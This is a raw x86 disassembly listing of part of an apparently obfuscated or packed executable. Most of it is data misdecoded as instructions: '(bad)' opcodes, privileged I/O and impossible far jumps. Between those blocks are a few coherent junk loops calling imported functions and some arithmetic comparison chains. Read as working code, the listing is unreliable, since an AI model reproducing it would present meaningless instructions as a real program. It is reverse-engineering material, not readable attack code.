  405194:	stos   DWORD PTR es:[edi],eax
  405195:	sub    dl,BYTE PTR [esi-0x394fa7cf]
  40519b:	mov    eax,ds:0xeea228f5
  4051a0:	jb     0x4051ee
  4051a2:	xchg   esi,eax
  4051a3:	stos   DWORD PTR es:[edi],eax
  4051a4:	and    DWORD PTR [esi-0x48],eax
  4051a7:	mov    DWORD PTR [ebx],edx
  4051a9:	dec    ecx
  4051aa:	inc    ecx
  4051ab:	rol    DWORD PTR [edx+0x7cfdcb7b],cl
  4051b1:	rdmsr  
  4051b3:	repz push ecx
  4051b5:	push   es
  4051b6:	xor    eax,0xe5da6e4e
  4051bb:	loop   0x405157
  4051bd:	ins    BYTE PTR es:[edi],dx
  4051be:	lahf   
  4051bf:	lahf   
  4051c0:	sub    DWORD PTR [esi],ebx
  4051c2:	lds    ebx,FWORD PTR [eax+0x20]
  4051c5:	mov    eax,0x3b97f7a9
  4051ca:	mov    dh,dh
  4051cc:	adc    BYTE PTR [ecx],bl
  4051ce:	jns    0x405159
  4051d0:	mov    ss,WORD PTR ds:0x29f074e8
  4051d6:	lds    eax,FWORD PTR [eax-0x3b]
  4051d9:	pushf  
  4051da:	shl    BYTE PTR [eax],0x78
  4051dd:	je     0x4051f6
  4051df:	cmc    
  4051e0:	cmc    
  4051e1:	pushf  
  4051e2:	push   ds
  4051e3:	jmp    0x4980:0x188b786e
  4051ea:	shl    BYTE PTR [esi+0x4a],0x10
  4051ee:	ds pop ds
  4051f0:	call   0x90515285
  4051f5:	cmp    eax,0x17afe36
  4051fa:	mov    eax,0x4f5d696c
  4051ff:	fdiv   DWORD PTR [esi+0x5715f84a]
  405205:	imul   esp,DWORD PTR [edx],0xfffffffb
  405208:	jp     0x4051db
  40520a:	adc    BYTE PTR [ebx+0x16],bl
  40520d:	stos   BYTE PTR es:[edi],al
  40520e:	(bad)  
  405210:	mov    esi,0xbb42e8cf
  405215:	fdivp  st(1),st
  405217:	(bad)  
  405218:	fild   QWORD PTR [ebx]
  40521a:	cmp    DWORD PTR [ebx+eax*8+0x37957d4e],esp
  405221:	sbb    al,0xbc
  405223:	adc    BYTE PTR [edi+0x4d02cdc5],ah
  405229:	or     DWORD PTR [esi+0x1ec813cc],ebx
  40522f:	js     0x405275
  405231:	mov    DWORD PTR [edx+0x71],esp
  405234:	out    0x2b,eax
  405236:	xchg   ebp,eax
  405237:	mov    dh,BYTE PTR [edx+eax*4-0x37d66a2]
  40523e:	iret   
  40523f:	cmp    dh,BYTE PTR ds:0xd4c52d2a
  405245:	and    DWORD PTR [edi-0x8],ecx
  405248:	icebp  
  405249:	fcom   st(0)
  40524b:	es jne 0x405213
  40524e:	dec    DWORD PTR [eax-0x48ceeb0a]
  405254:	ins    BYTE PTR es:[edi],dx
  405255:	das    
  405256:	rcr    dh,0x60
  405259:	(bad)  
  40525a:	(bad)  
  40525b:	clc    
  40525c:	test   al,0xd5
  40525e:	stos   DWORD PTR es:[edi],eax
  40525f:	or     BYTE PTR [esi-0x5c1f3d38],al
  405265:	jg     0x4052de
  405267:	mov    esi,0xcdcfb981
  40526c:	or     ebp,edx
  40526e:	popa   
  40526f:	and    eax,0x8f19ae5f
  405274:	fsub   DWORD PTR [edx+0x25d7a984]
  40527a:	xchg   eax,esp
  40527c:	fdivrp st(1),st
  40527e:	pusha  
  40527f:	sbb    esi,DWORD PTR [ebp-0x84a3a5d]
  405285:	(bad)  
  405286:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  405287:	push   esi
  405288:	push   esi
  405289:	jns    0x40529f
  40528b:	ins    DWORD PTR es:[edi],dx
  40528c:	repnz sbb BYTE PTR [esi+0x35],cl
  405290:	pop    edi
  405291:	push   ds
  405292:	xchg   ebp,eax
  405293:	scas   al,BYTE PTR es:[edi]
  405294:	mov    edx,0xd5f6b46f
  405299:	dec    esi
  40529a:	(bad)  
  40529b:	jmp    0x47ab:0x42145486
  4052a2:	imul   edi,DWORD PTR [ebp+0x1855ac9b],0x5930b0e1
  4052ac:	and    esp,ebx
  4052ae:	loope  0x4052b0
  4052b0:	push   esp
  4052b1:	sti    
  4052b2:	lock sub ebp,0xffffffb6
  4052b6:	mov    edi,ebx
  4052b8:	or     dh,BYTE PTR [edx+0x7f3c0cce]
  4052be:	(bad)  
  4052c0:	(bad)  
  4052c2:	imul   esp,DWORD PTR [eax-0x27ca15cf],0xffffffee
  4052c9:	icebp  
  4052ca:	push   ss
  4052cb:	jmp    0x8687480c
  4052d0:	rcr    DWORD PTR [ecx+edx*8+0x26],cl
  4052d4:	(bad)  
  4052d5:	mov    edx,0x6a4343ce
  4052da:	pop    esi
  4052db:	sub    bh,BYTE PTR [ecx+0x6c0acf85]
  4052e1:	imul   eax,DWORD PTR [eax-0x5f30d19c],0xfffffffa
  4052e8:	in     eax,dx
  4052e9:	dec    eax
  4052ea:	sar    DWORD PTR [bx-0x6e9e],cl
  4052ef:	and    dl,ch
  4052f1:	into   
  4052f2:	sti    
  4052f3:	mov    dl,0x59
  4052f6:	cmp    edi,ecx
  4052f8:	mov    esi,0x73074362
  4052fd:	ins    BYTE PTR es:[edi],dx
  4052fe:	adc    al,0xc
  405300:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  405301:	jmp    0xeea11ef4
  405306:	sub    ebx,eax
  405308:	mov    al,0x47
  40530a:	(bad)
  40530e:	dec    ebp
  40530f:	or     al,0x3b
  405311:	and    eax,0x90c86a1
  405316:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  405317:	add    ah,cl
  405319:	dec    edx
  40531a:	push   eax
  40531b:	dec    ecx
  40531c:	pop    ebp
  40531d:	sar    dh,cl
  40531f:	pop    ds
  405320:	rcl    BYTE PTR [edi],cl
  405322:	push   cs
  405323:	pop    ecx
  405324:	shl    ch,0xc8
  405327:	mov    BYTE PTR [eax+0x469171bd],bl
  40532d:	test   eax,0x38f4a138
  405332:	test   DWORD PTR [esi],esi
  405334:	out    0xe4,al
  405336:	push   ebx
  405337:	outs   dx,DWORD PTR ds:[esi]
  405338:	sub    DWORD PTR [esi+0x19],edi
  40533b:	lods   al,BYTE PTR ds:[esi]
  40533c:	jmp    0xe9940b21
  405341:	aaa    
  405342:	fnstcw WORD PTR [esi+0x18c7d2da]
  405348:	mov    WORD PTR [ebp-0x4c7cc3af],gs
  40534e:	jns    0x40536c
  405350:	mov    edi,DWORD PTR [edi]
  405352:	push   ebx
  405353:	mov    al,ds:0x3e0f323d
  405358:	dec    ecx
  405359:	fcom   QWORD PTR [ecx+0x7a158422]
  40535f:	sahf   
  405360:	mov    ds:0xcfa165d5,al
  405365:	lds    edx,FWORD PTR [edx-0x4]
  405368:	adc    DWORD PTR [eax],0xfffffffd
  40536b:	add    DWORD PTR [eax+0x0],ebp
  40536e:	jl     0x4053e9
  405370:	aam    0xa
  405372:	pop    edi
  405373:	sbb    dh,0x24
  405376:	xchg   esp,eax
  405377:	aad    0x94
  405379:	neg    al
  40537b:	daa    
  40537c:	pop    edx
  40537d:	adc    BYTE PTR [eax+0x42],al
  405380:	fdiv   QWORD PTR [edi]
  405382:	xor    ebp,DWORD PTR [ebp+0x5493b39b]
  405388:	inc    ebx
  405389:	and    al,0xdb
  40538b:	mov    bh,0xdf
  40538d:	inc    esp
  40538e:	push   ebx
  40538f:	bnd js 0x405357
  405392:	dec    BYTE PTR [ebx+0x2a4e0c1e]
  405398:	sbb    eax,0xe9079117
  40539d:	and    al,cl
  40539f:	or     edi,DWORD PTR [ebp-0x8e48694]
  4053a5:	mov    al,ds:0xdd8d40dc
  4053aa:	pop    ebx
  4053ab:	mov    ds:0x27cdc925,eax
  4053b0:	scas   eax,DWORD PTR es:[edi]
  4053b1:	lahf   
  4053b2:	data16 sbb al,0xc6
  4053b5:	(bad)  
  4053b6:	out    0x7f,eax
  4053b8:	mov    esi,0x6c37740e
  4053bd:	das    
  4053be:	adc    dl,BYTE PTR [edx-0x4de2c1b2]
  4053c4:	das    
  4053c5:	jne    0x40536f
  4053c7:	mov    ah,0xd4
  4053c9:	or     DWORD PTR [ebx+0x60c64dc4],esi
  4053cf:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4053d0:	sub    dh,BYTE PTR [eax-0x6e5da005]
  4053d6:	bound  ebp,QWORD PTR fs:[ebp-0x372025bf]
  4053dd:	fdivrp st(7),st
  4053df:	daa    
  4053e0:	(bad)  
  4053e1:	mov    bh,0xb4
  4053e3:	fdivr  DWORD PTR [esi+0x5f]
  4053e6:	in     al,0x91
  4053e8:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4053e9:	gs mov cl,0x50
  4053ec:	das    
  4053ed:	sub    eax,0x68273431
  4053f2:	and    al,0x85
  4053f4:	jbe    0x405402
  4053f6:	adc    bh,bh
  4053f8:	test   DWORD PTR [ecx-0x66],edx
  4053fb:	and    BYTE PTR [eax-0x2d8da400],0x9
  405402:	mov    ch,0x19
  405404:	dec    ebp
  405405:	push   ecx
  405406:	sub    eax,0xe0632adf
  40540b:	sahf   
  40540c:	mov    al,ds:0x7c864ebd
  405411:	xchg   esp,eax
  405412:	mov    eax,0xc1f0d0c
  405417:	pusha  
  405418:	push   ebx
  405419:	cmp    al,0x76
  40541b:	xchg   ebp,eax
  40541c:	ins    BYTE PTR es:[edi],dx
  40541d:	fs mov eax,0x8350333c
  405423:	lds    esi,FWORD PTR [ecx-0x60]
  405426:	pop    ss
  405427:	dec    esp
  405428:	jl     0x405477
  40542a:	jmp    0xb8033f20
  40542f:	xchg   edi,eax
  405430:	push   eax
  405431:	and    esp,edi
  405433:	xor    DWORD PTR [ecx+edx*4],ebx
  405436:	mov    cl,0x2d
  405438:	out    0xab,eax
  40543a:	sub    ebx,edi
  40543c:	mov    ah,0xfa
  40543e:	or     al,0x30
  405440:	add    ecx,0x173d8166
  405446:	ror    BYTE PTR [eax+0x7343cba8],1
  40544c:	repz and esi,esi
  40544f:	push   esp
  405450:	xor    edi,DWORD PTR [ebx]
  405452:	sub    al,0xa5
  405454:	xor    BYTE PTR [edx+0x15f9c086],bh
  40545a:	and    dl,BYTE PTR [edi-0x26]
  40545d:	inc    ebx
  40545e:	dec    esp
  40545f:	dec    eax
  405460:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  405461:	or     bh,ch
  405463:	gs add dl,al
  405466:	sti    
  405467:	push   ss
  405468:	loopne 0x40541b
  40546a:	push   esp
  40546b:	jg     0x4054c6
  40546d:	jecxz  0x4054b8
  40546f:	rcr    BYTE PTR gs:[edi+0x1f],0x59
  405474:	sar    eax,0xb0
  405477:	jecxz  0x40543f
  405479:	sbb    BYTE PTR [esp+eax*2-0x2b],bl
  40547d:	mov    al,ch
  40547f:	bnd jne 0x405431
  405482:	push   ss
  405483:	push   esp
  405484:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  405485:	rcl    dh,cl
  405487:	loop   0x405474
  405489:	jns    0x40548a
  40548b:	clc    
  40548c:	pop    es
  40548d:	dec    ebx
  40548e:	nop
  40548f:	out    dx,eax
  405490:	push   eax
  405491:	xlat   BYTE PTR ds:[ebx]
  405492:	push   ss
  405493:	dec    edi
  405494:	cmp    eax,0x800eb472
  405499:	daa    
  40549a:	ror    ch,1
  40549c:	and    DWORD PTR [di+0x1005],0x11957da0
  4054a5:	and    ebx,DWORD PTR [edx+ecx*1-0x5a]
  4054a9:	jo     0x405463
  4054ab:	sbb    eax,0xcfdd21b2
  4054b0:	or     al,0xef
  4054b2:	mov    ecx,0x972b610b
  4054b7:	iret   
  4054b8:	push   esp
  4054b9:	ja     0x40547f
  4054bb:	and    ecx,esp
  4054bd:	push   ecx
  4054be:	sub    DWORD PTR [esi+0x67e834d1],0x689023b0
  4054c8:	sub    edi,DWORD PTR [edx+0x47]
  4054cb:	mov    cl,0xd5
  4054cd:	add    edx,ecx
  4054cf:	jmp    0x4063ea
  4054d4:	mov    edx,DWORD PTR [ebp-0x2c]
  4054d7:	mov    edi,DWORD PTR [ebp-0x4]
  4054da:	xor    edx,eax
  4054dc:	movzx  ebx,BYTE PTR ds:0x4337e7
  4054e3:	or     DWORD PTR ds:0x433803,ebx
  4054e9:	xor    edi,eax
  4054eb:	and    DWORD PTR ds:0x4337f3,0x0
  4054f5:	xor    ebx,ebx
  4054f7:	add    ebx,DWORD PTR ds:0x4337f3
  4054fd:	inc    ebx
  4054fe:	mov    DWORD PTR ds:0x4337f3,ebx
  405504:	cmp    DWORD PTR ds:0x4337f3,0x6
  40550b:	jne    0x40552b
  405511:	push   0x1804
  405516:	push   0x80d8
  40551b:	push   0x74bc
  405520:	push   0x5a14
  405525:	call   DWORD PTR ds:0x412370
  40552b:	cmp    DWORD PTR ds:0x4337f3,0x5
  405532:	jne    0x405545
  405538:	mov    ebx,DWORD PTR ds:0x4337f3
  40553e:	inc    ebx
  40553f:	mov    DWORD PTR ds:0x4337f3,ebx
  405545:	cmp    DWORD PTR ds:0x4337f3,0x1e
  40554c:	jb     0x4054f5
  405552:	mov    DWORD PTR ds:0x4337f7,0x387c
  40555c:	add    edi,ecx
  40555e:	add    edx,ecx
  405560:	imul   edx,edi
  405563:	mov    edi,DWORD PTR [ebp-0x8]
  405566:	and    DWORD PTR ds:0x4337b7,0x0
  405570:	mov    ebx,DWORD PTR ds:0x4337b7
  405576:	inc    ebx
  405577:	mov    DWORD PTR ds:0x4337b7,ebx
  40557d:	cmp    DWORD PTR ds:0x4337b7,0x2c
  405584:	jne    0x4055b0
  40558a:	push   DWORD PTR [ebp-0x28]
  40558d:	push   0x7933
  405592:	push   0x433946
  405597:	push   DWORD PTR [ebp-0x28]
  40559a:	push   DWORD PTR [ebp-0x24]
  40559d:	push   DWORD PTR [ebp-0x1c]
  4055a0:	push   0x42e0
  4055a5:	push   0x392f
  4055aa:	call   DWORD PTR ds:0x412374
  4055b0:	cmp    DWORD PTR ds:0x4337b7,0x1e
  4055b7:	jb     0x405570
  4055bd:	mov    ebx,DWORD PTR [ebp-0x10]
  4055c0:	sub    ebx,edi
  4055c2:	cmp    ebx,edx
  4055c4:	ja     0x4055d2
  4055ca:	mov    edx,DWORD PTR [ebp-0x28]
  4055cd:	jmp    0x4063dc
  4055d2:	mov    edx,DWORD PTR [ebp-0x30]
  4055d5:	mov    edi,DWORD PTR [ebp-0x4]
  4055d8:	xor    edx,eax
  4055da:	xor    edi,eax
  4055dc:	add    edi,ecx
  4055de:	add    edx,ecx
  4055e0:	imul   edx,edi
  4055e3:	mov    edi,DWORD PTR [ebp-0x8]
  4055e6:	mov    ebx,DWORD PTR [ebp-0x10]
  4055e9:	sub    ebx,edi
  4055eb:	cmp    ebx,edx
  4055ed:	ja     0x4055fb
  4055f3:	mov    edx,DWORD PTR [ebp-0x2c]
  4055f6:	jmp    0x4063dc
  4055fb:	mov    edx,DWORD PTR [ebp-0x34]
  4055fe:	mov    edi,DWORD PTR [ebp-0x4]
  405601:	xor    edx,eax
  405603:	xor    edi,eax
  405605:	add    edi,ecx
  405607:	add    edx,ecx
  405609:	imul   edx,edi
  40560c:	mov    edi,DWORD PTR [ebp-0x8]
  40560f:	mov    ebx,DWORD PTR [ebp-0x10]
  405612:	sub    ebx,edi
  405614:	cmp    ebx,edx
  405616:	ja     0x40597e
  40561c:	jmp    0x405976
  405621:	(bad)  [eax+0x65]
  405624:	pop    eax
  405625:	jne    0x405698
  405627:	loope  0x405672
  405629:	clc    
  40562a:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40562b:	dec    ebp
  40562c:	push   0xceddc6c1
  405631:	test   eax,0x337e7e37
  405636:	jge    0x4056b6
  405638:	jle    0x40568f
  40563a:	and    al,0xee
  40563c:	add    ecx,DWORD PTR [ebx-0x627346c2]
  405642:	adc    DWORD PTR [ecx+0x30ad6a],esp
  405648:	push   eax
  405649:	mov    eax,0x4bf2fdd
  40564e:	mov    bl,0xb7
  405650:	mov    esi,0xea00a714
  405655:	jmp    0x88484242
  40565a:	mov    bl,0xbe
  40565c:	jecxz  0x40564f
  40565e:	jnp    0x405644
  405660:	ret    0x3b7d
  405663:	mov    ch,0x5d
  405665:	in     eax,0x5
  405667:	cmp    ebx,DWORD PTR [edx]
  405669:	push   ss
  40566a:	aas    
  40566b:	fistp  QWORD PTR [ebp-0x7588a31b]
  405671:	push   ecx
  405672:	and    edi,DWORD PTR [edi-0x1b7e722a]
  405678:	xor    BYTE PTR [eax],ch
  40567a:	scas   eax,DWORD PTR es:[edi]
  40567b:	inc    eax
  40567c:	sahf   
  40567d:	fst    st(2)
  40567f:	loop   0x40566c
  405681:	mov    al,0xa1
  405683:	(bad)  
  405684:	cmp    dl,BYTE PTR [edx-0x72b4c810]
  40568a:	dec    eax
  40568b:	dec    edi
  40568c:	adc    DWORD PTR [ebp+0x2c40a16f],esp
  405692:	mov    bh,0xe3
  405694:	cmp    bh,BYTE PTR [eax+ecx*8]
  405697:	jl     0x4056c6
  405699:	popf   
  40569a:	xor    ebp,eax
  40569c:	popf   
  40569d:	idiv   DWORD PTR [eax]
  40569f:	mov    ds:0xdb8ed00a,al
  4056a4:	dec    ebp
  4056a5:	xchg   edx,eax
  4056a6:	dec    ebp
  4056a7:	xchg   ebp,eax
  4056a8:	lahf   
  4056a9:	loop   0x405643
  4056ab:	or     al,BYTE PTR [edx]
  4056ad:	outs   dx,DWORD PTR ds:[esi]
  4056ae:	iret   
  4056af:	arpl   WORD PTR [ebx-0x5f],bp
  4056b2:	rcr    BYTE PTR [edi],cl
  4056b4:	popa   
  4056b5:	pop    ebp
  4056b6:	shl    DWORD PTR [edi+ecx*4],1
  4056b9:	adc    cl,BYTE PTR [eax-0x7b]
  4056bc:	xor    esi,DWORD PTR [ebx+edi*4+0x1a1f257c]
  4056c3:	es mov edi,0xca44e792
  4056c9:	js     0x405747
  4056cb:	push   ebx
  4056cc:	sbb    DWORD PTR [esi],edx
  4056ce:	dec    BYTE PTR [ecx]
  4056d0:	cmp    bh,BYTE PTR [esi-0x4399cadc]
  4056d6:	(bad)  
  4056d7:	pop    ecx
  4056d8:	xchg   ecx,eax
  4056d9:	pop    esi
  4056da:	sbb    al,0x35
  4056dc:	or     eax,0x460701c4
  4056e1:	xchg   ebp,eax
  4056e2:	jle    0x405740
  4056e4:	push   ebp
  4056e5:	es dec edi
  4056e7:	loopne 0x405678
  4056e9:	cmp    DWORD PTR [edi+eax*8+0x5],ebx
  4056ed:	or     al,0xcd
  4056ef:	and    edx,esi
  4056f1:	ror    DWORD PTR [edx-0x463db012],cl
  4056f7:	mov    edi,0x6eb7bcfd
  4056fc:	pop    esi
  4056fd:	stos   BYTE PTR es:[edi],al
  4056fe:	lds    esi,FWORD PTR [ebp+0x164a524b]
  405704:	repnz fwait
  405706:	sub    esi,DWORD PTR [ebp-0x4b389b07]
  40570c:	loope  0x405744
  40570e:	dec    ebp
  40570f:	xor    eax,0x28b772ec
  405714:	ds pusha 
  405716:	popa   
  405717:	push   es
  405718:	adc    BYTE PTR [eax+0x1c3f482f],ch
  40571e:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40571f:	rcr    DWORD PTR [eax+0x29],0xaa
  405723:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  405724:	retf   0xe98f
  405727:	jne    0x4056e1
  405729:	icebp  
  40572a:	mov    al,ds:0x9cf0c5c9
  40572f:	inc    esi
  405730:	test   BYTE PTR [edx-0x115d36e2],0xd8
  405737:	call   0xa432:0xc5f6300d
  40573e:	imul   eax,DWORD PTR es:[ecx+0x22eac1b5],0x7ffbdfab
  405749:	jl     0x405724
  40574b:	sti    
  40574c:	pop    ebx
  40574d:	enter  0xe80b,0x24
  405751:	mov    edi,0x7d06ddb0
  405756:	daa    
  405757:	(bad)  
  405758:	xor    esp,DWORD PTR [ecx]
  40575a:	adc    dl,BYTE PTR [edx+0x23]
  40575d:	xlat   BYTE PTR ds:[ebx]
  40575e:	dec    eax
  40575f:	jne    0x4056ee
  405761:	aas    
  405762:	hlt    
  405763:	inc    ebx
  405764:	test   eax,0x28f8d818
  405769:	add    eax,0x413bd112
  40576e:	dec    ecx
  40576f:	cdq    
  405770:	push   eax
  405771:	sbb    cl,BYTE PTR [ecx-0x7]
  405774:	jae    0x405703
  405776:	mov    dh,0x62
  405778:	stc    
  405779:	neg    BYTE PTR [ecx+eax*1+0x13cabb5c]
  405780:	lahf   
  405781:	mov    ecx,0x3a12a0a2
  405786:	ds mov esi,0x1dfa599e
  40578c:	mov    ch,0x32
  40578e:	ja     0x405728
  405790:	adc    eax,0x558d290a
  405795:	jl     0x40577d
  405797:	test   ebx,ecx
  405799:	icebp  
  40579a:	lahf   
  40579b:	jl     0x405815
  40579d:	xor    cl,BYTE PTR [ebx+0x41]
  4057a0:	and    BYTE PTR [esi-0x66],0x51
  4057a4:	jp     0x4057ba
  4057a6:	push   esi
  4057a7:	add    al,0x64
  4057a9:	add    ecx,0xf2ab8286
  4057af:	sub    eax,DWORD PTR [eax]
  4057b1:	adc    DWORD PTR [edx*2-0x5279421c],ecx
  4057b8:	mul    BYTE PTR [edi+0x26]
  4057bb:	and    DWORD PTR [eax+eiz*2-0x6c],esi
  4057bf:	inc    edx
  4057c0:	mov    ecx,0x88e6665f
  4057c5:	cli    
  4057c6:	mov    ebx,edi
  4057c8:	pop    eax
  4057c9:	pop    ecx
  4057ca:	adc    eax,0x274a47f2
  4057cf:	je     0x40577a
  4057d1:	ins    DWORD PTR es:[edi],dx
  4057d2:	pusha  
  4057d3:	addr16 jmp 0xb46e:0x44fab37
  4057db:	fiadd  DWORD PTR [edi]
  4057dd:	loope  0x405830
  4057df:	and    eax,0xfed2fe95
  4057e4:	sbb    al,0x27
  4057e6:	inc    esp
  4057e7:	mov    WORD PTR [edx],cs
  4057e9:	sbb    al,0xad
  4057eb:	cmp    DWORD PTR [esi+ebp*1+0x29],edx
  4057ef:	idiv   BYTE PTR [eax+0x8]
  4057f2:	or     edi,DWORD PTR [eax-0xf]
  4057f5:	(bad)  
  4057f6:	ficom  WORD PTR [ebx+0x2e14de4d]
  4057fc:	lods   eax,DWORD PTR ds:[esi]
  4057fd:	call   0x20803316
  405802:	adc    BYTE PTR [edi-0x68],dh
  405805:	pop    ds
  405806:	inc    ebx
  405807:	jg     0x4057d3
  405809:	adc    al,0x4d
  40580b:	repz adc bh,ah
  40580e:	and    eax,0x329cf8d5
  405813:	jge    0x405818
  405815:	dec    ecx
  405816:	or     BYTE PTR [edx],dh
  405818:	or     ebx,DWORD PTR [esp+edx*1-0x2a856647]
  40581f:	xor    eax,0xa642ef77
  405824:	in     al,0x4c
  405826:	inc    eax
  405827:	(bad)  
  405828:	xlat   BYTE PTR ds:[ebx]
  405829:	add    dh,BYTE PTR [esi]
  40582b:	into   
  40582c:	outs   dx,DWORD PTR ds:[esi]
  40582d:	inc    bx
  40582f:	push   es
  405830:	xchg   BYTE PTR [edi*4+0x71102c13],bh
  405837:	and    ebp,DWORD PTR [edi-0x3b412785]
  40583d:	pop    esi
  40583e:	mov    cl,0xc
  405840:	mov    DWORD PTR [esi+0x46],edx
  405843:	stc    
  405844:	push   ebx
  405845:	and    DWORD PTR ds:0xd5faf35d,0x49adf405
  40584f:	mov    DWORD PTR [edx+0x246c62a2],edx
  405855:	jp     0x405846
  405857:	jmp    0x6822a040
  40585c:	cwde   
  40585d:	inc    ebx
  40585e:	or     dl,BYTE PTR ds:0xd1723a30
  405864:	cmp    cl,BYTE PTR [edx-0x16]
  405867:	mov    esp,0xa825c71b
  40586c:	repnz add eax,DWORD PTR [ebx]
  40586f:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  405870:	rol    DWORD PTR [esp+edx*8-0x1b],cl
  405874:	sbb    bh,BYTE PTR [esi]
  405876:	or     BYTE PTR [ecx+0x26],0xa0
  40587a:	and    BYTE PTR [eax],bl
  40587c:	ins    DWORD PTR es:[edi],dx
  40587d:	xchg   DWORD PTR [esi-0x4e],edx
  405880:	test   eax,0x6d2e22e0
  405885:	mov    edx,edi
  405887:	(bad)  
  405888:	pop    ebp
  405889:	jl     0x4058eb
  40588b:	push   ecx
  40588c:	push   ecx
  40588d:	mov    ebp,0x5156981c
  405892:	jae    0x4058ac
  405894:	out    0x69,al
  405896:	popa   
  405897:	mov    dl,0x35
  405899:	cmp    DWORD PTR [ebp+0xe669b18],0xfffffffa
  4058a0:	jg     0x4058a9
  4058a2:	sti    
  4058a3:	cmc    
  4058a4:	sub    DWORD PTR ds:0xdf414dd7,edi
  4058aa:	imul   ebp,DWORD PTR [edx+0x46aa1f28],0x6d23f51d
  4058b4:	jnp    0x4058ba
  4058b6:	cmc    
  4058b7:	popa   
  4058b8:	jl     0x4058e0
  4058ba:	lods   eax,DWORD PTR ds:[esi]
  4058bb:	sub    al,0x23
  4058bd:	mov    esi,0x84748af5
  4058c2:	dec    ebp
  4058c3:	mov    al,0xf0
  4058c5:	push   0x673000e1
  4058ca:	and    BYTE PTR [edx-0x1636f5c0],bl
  4058d0:	cmc    
  4058d1:	loopne 0x4058ee
  4058d3:	xchg   bl,dh
  4058d5:	dec    edx
  4058d6:	xchg   esi,eax
  4058d7:	mov    ecx,0x4b6eb305
  4058dc:	mov    ds:0xc33eabd2,al
  4058e1:	mov    edx,0x5e54fbe7
  4058e6:	pop    ss
  4058e7:	rcl    BYTE PTR [ecx],cl
  4058e9:	dec    ebp
  4058ea:	(bad)  
  4058eb:	aam    0x0
  4058ed:	jecxz  0x405923
  4058ef:	repnz into 
  4058f1:	mov    ch,0x58
  4058f3:	or     ch,BYTE PTR [eax]
  4058f5:	fiadd  WORD PTR [ebx+0x7]
  4058f8:	les    eax,FWORD PTR [esp+edi*8]
  4058fb:	jno    0x405975
  4058fd:	shl    DWORD PTR [ecx],1
  4058ff:	xor    BYTE PTR [ebp-0x40],dl
  405902:	aaa    
  405903:	xlat   BYTE PTR ds:[ebx]
  405904:	div    DWORD PTR [esi]
  405906:	ret    
  405907:	jo     0x405902
  405909:	leave  
  40590a:	adc    eax,0x7b4a6455
  40590f:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  405910:	sbb    ebp,DWORD PTR [ecx+0xd]
  405913:	(bad)  
  405914:	mov    ebx,0xdb6dcc7d
  405919:	hlt    
  40591a:	jnp    0x4058f4
  40591c:	das    
  40591d:	imul   ecx,DWORD PTR gs:[ebx+0x4036ed89],0xc
  405925:	stos   BYTE PTR es:[edi],al
  405926:	push   0x5599d17b
  40592b:	jno    0xc0b3bf3b
  405931:	xor    eax,0x6ca3d1ad
  405936:	test   BYTE PTR [eax-0x2dcc6844],0xae
  40593d:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40593e:	pop    edx
  40593f:	mov    bl,0x2d
  405941:	aam    0x8f
  405943:	pop    edi
  405944:	aad    0xae
  405946:	fsubr  QWORD PTR ds:[bp+0x18be]
  40594c:	(bad)  
  40594d:	jmp    0x405947
  40594f:	push   ds
  405950:	cmc    
  405951:	cs in  eax,dx
  405953:	fnstenv [eax]
  405955:	stos   DWORD PTR es:[edi],eax
  405956:	daa    
  405957:	test   DWORD PTR [edx],edx
  405959:	dec    edx
  40595a:	pop    edx
  40595b:	pop    ss
  40595c:	outs   dx,BYTE PTR ds:[esi]
  40595d:	and    esi,DWORD PTR [edx]
  40595f:	mov    eax,ecx
  405961:	and    cl,BYTE PTR ds:0x887c1647
  405967:	scas   al,BYTE PTR es:[edi]
  405968:	add    DWORD PTR [ecx-0x2e],eax
  40596b:	and    bl,BYTE PTR [edx-0xb30de29]
  405971:	sbb    BYTE PTR [eax+ebx*8],ch
  405974:	mov    bl,0xdc
  405976:	mov    edx,DWORD PTR [ebp-0x30]
  405979:	jmp    0x4063dc
  40597e:	mov    edx,DWORD PTR [ebp-0x38]
  405981:	mov    edi,DWORD PTR [ebp-0x4]
  405984:	xor    edx,eax
  405986:	xor    edi,eax
  405988:	add    edi,ecx
  40598a:	add    edx,ecx
  40598c:	imul   edx,edi
  40598f:	mov    edi,DWORD PTR [ebp-0x8]
  405992:	mov    ebx,DWORD PTR [ebp-0x10]
  405995:	sub    ebx,edi
  405997:	cmp    ebx,edx
  405999:	ja     0x405d01
  40599f:	jmp    0x405cf9
  4059a4:	push   0x20
  4059a6:	outs   dx,BYTE PTR ds:[esi]
  4059a7:	adc    dh,BYTE PTR [eax+edx*2+0x72]
  4059ab:	pusha  
  4059ac:	cli    
  4059ad:	sar    BYTE PTR [eax+0x5f],1
  4059b0:	loop   0x4059fb
  4059b2:	jmp    0x7e72c489
  4059b7:	jle    0x4059ec
  4059b9:	jge    0x405a39
  4059bb:	jle    0x4059a8
  4059bd:	jg     0x405993
  4059bf:	xchg   eax,edi
  4059c1:	lods   eax,DWORD PTR ds:[esi]
  4059c2:	in     al,0x55
  4059c4:	jmp    0x4059ee
  4059c6:	aad    0x41
  4059c8:	clc    
  4059c9:	xlat   BYTE PTR cs:[ebx]
  4059cb:	sti    
  4059cc:	xchg   esp,eax
  4059cd:	fist   DWORD PTR ds:0x5f97e4fb
  4059d3:	retf   0xfc7e
  4059d6:	jle    0x405a0e
  4059d8:	push   ecx
  4059d9:	dec    esp
  4059da:	mov    WORD PTR [edx-0x5],cs
  4059dd:	and    edx,DWORD PTR [esi]
  4059df:	jl     0x405a5b
  4059e1:	xchg   esp,eax
  4059e2:	sub    al,0xef
  4059e4:	adc    al,0x46
  4059e6:	neg    DWORD PTR [ebp+ebx*8+0x3b93943f]
  4059ed:	inc    ebp
  4059ee:	push   0xffffff97
  4059f0:	lahf   
  4059f1:	ss lock popa 
  4059f4:	ja     0x40597b
  4059f6:	loopne 0x405a77
  4059f8:	pop    ecx
  4059f9:	mov    ecx,0x81b96304
  4059fe:	inc    BYTE PTR [ecx]
